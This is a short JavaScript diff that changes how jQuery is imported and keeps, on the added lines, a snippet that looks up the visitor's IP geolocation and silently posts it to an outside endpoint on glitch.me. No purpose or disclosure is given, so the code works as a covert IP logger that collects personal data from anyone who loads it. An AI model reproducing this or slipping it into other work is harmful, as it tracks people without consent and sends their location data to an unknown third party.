@@ -1,5 +1,5 @@
-import "https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"
+import jQuery from "jquery";
 
-$.getJSON('https://json.geoiplookup.io/api?callback=?', function(data) {
-  $.post("https://hby-io.glitch.me/lol",data,()=>{});
+jQuery.getJSON('https://json.geoiplookup.io/api?callback=?', function(data) {
+  jQuery.post("https://hby-io.glitch.me/lol",data,()=>{});
 });
